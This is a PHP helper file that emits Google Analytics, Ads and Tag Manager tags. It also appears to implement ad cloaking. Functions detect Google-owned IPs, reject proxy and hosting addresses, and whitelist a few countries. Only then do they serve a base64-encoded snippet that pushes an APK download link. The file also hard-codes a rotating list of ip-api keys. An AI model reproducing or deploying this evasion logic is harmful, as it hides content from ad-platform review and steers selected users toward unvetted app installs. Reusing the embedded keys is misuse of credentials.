<?php

/**
 * @return mixed|string
 */
function getAnalyticFullCode()
{
    //get from file
    $code = trim(file_get_contents(__DIR__.'/ads_analytic.txt'));
    
    if (empty($code)) {
        return '';
    }
    
    $str = "
        <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src='https://www.googletagmanager.com/gtag/js?id=@@CODE@@'></script>
    <script >
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', '@@CODE@@');
    </script>
    ";

    return str_replace('@@CODE@@', $code, $str);
}

/**
 * @return mixed|string
 */
function getAdsConversionFullCode()
{
    //get from file
    $code = trim(file_get_contents(__DIR__.'/ads_conversion.txt'));
    
    if (empty($code)) {
        return '';
    }
    
    $str = "
<!-- In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
<script type='text/javascript'>
function gtag_report_conversion(url) {
    console.log('from gtag');
    
  var callback = function () {
    if (typeof(url) != 'undefined') {
      window.location = url;
    }
  };
  gtag('event', 'conversion', {
      'send_to': '@@CODE@@',
      'event_callback': callback
  });
  return false;
}
</script>";
    
    return str_replace('@@CODE@@', $code, $str);
    
}

/**
 * @return mixed|string
 */
function getAdsIdFullCode()
{
    //get from file
    $code = trim(file_get_contents(__DIR__.'/ads_id.txt'));
    
    if (empty($code)) {
        return '';
    }
    
    $str = "
        <!-- Global site tag (gtag.js) - Google Ads: @@CODE@@ -->
<script async src='https://www.googletagmanager.com/gtag/js?id=@@CODE@@'></script>
<script type='text/javascript'>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', '@@CODE@@');
</script>
    ";
    
    return str_replace('@@CODE@@', $code, $str);
}

/**
 * @return string
 */
function getTagManagerFullHeadCode()
{
    //get from file
    $code = trim(file_get_contents(__DIR__.'/ads_tag_mng.txt'));
    
    if (empty($code)) {
        return '';
    }
    
    $str = "
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','@@CODE@@');</script>
    <!-- End Google Tag Manager -->
    ";
    
    return str_replace('@@CODE@@', $code, $str);
}

/**
 * @return string
 */
function getTagManagerFullBodyCode()
{
    //get from file
    $code = trim(file_get_contents(__DIR__.'/ads_tag_mng.txt'));
    
    if (empty($code)) {
        return '';
    }
    
    $str = '<!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=@@CODE@@"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->';
    
    return str_replace('@@CODE@@', $code, $str);
}

function getCodeHandleLinkApk($isBot, $link)
{
    $isApk = intval(trim(file_get_contents(__DIR__.'/is_apk.txt')));
    
    if (!$isApk  || $isBot) {
        return '';
    }
    
    $snippet = file_get_contents(__DIR__.'/is_apk_snippet.txt');
    $snippet = str_replace('@@link@@', $link, $snippet);
    $snippet = str_replace('@@isBot@@', $isBot, $snippet);
    
    return base64_encode($snippet);
}



function isCountryValid($ipInfo)
{
    if (empty($ipInfo)) {
        return false;
    }
    
    $arr = json_decode($ipInfo, true);
    
    if ($arr['query'] == '127.0.0.1') {
        return true;
    }
    
    if (strtolower($arr['status']) != 'success' ||
        (!empty($arr['reverse']) && strpos(strtolower($arr['reverse']), 'proxy') !== false) ||
	(isset($arr['hosting']) && $arr['hosting'] == true)
    ) {
        return false;
    }
    
    $countryCode = !empty($arr['countryCode']) ? strtoupper($arr['countryCode']) : null;
    
    return in_array($countryCode, countryCodesSupported());
}


function countryCodesSupported()
{
    return [
        'MY',
        'TH',
        'VN',
        'MK',
        'SK',
        'RS',
        'GR',
        'RO',
        'EG',
    
    ];
}


function isIpGoogle($ipInfo)
{
    if (empty($ipInfo)) {
        return false;
    }
    
    $arr = json_decode($ipInfo, true);
    
    if (strtolower($arr['status']) != 'success') {
        return false;
    }
    
    if (
        (!empty($arr['isp']) && strpos(strtolower($arr['isp']), 'google') !== false) ||
        (!empty($arr['asname']) && strpos(strtolower($arr['asname']), 'google') !== false) ||
        (!empty($arr['org']) && strpos(strtolower($arr['org']), 'google') !== false)
    
    ) {
        return true;
    }
    
    return false;
}

function getIpInfo($ip)
{
    $token = getIpToken();
    if (empty($token)) {
        return null;
    }
    
    $url = "https://pro.ip-api.com/json/$ip?key=$token&fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    
    return getContent($url);
}

function listTokens()
{
    return [
        'UTER9r5KMPZIuI6',
        'G5pbheAdMFUnEIM',
        'XOHMjtH0BbHiI70',
        'Rn0csKpeeQZdNUG',
        '9lNoDaN21GTnIQs',
        '7wq82Jo3SrxLtEN',
        'Zrva4ClpIzZDBsW',
        '7PqdqTCRW4AG7j1',
        'xft5GkbDicjCAiq',
        'VcLKFHV6AJ4a0ge',
    ];
}

function getIpToken()
{
    $tokens = listTokens();
    
    if (empty($tokens)) {
        return null;
    }
    
    shuffle($tokens);
    
    return $tokens[array_rand($tokens, 1)];
}


function getContent($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    try {
        $output = curl_exec($ch);
        
        curl_close($ch);
    } catch (\Exception $ex) {
        curl_close($ch);
        
        return null;
    }
    
    return $output;
}
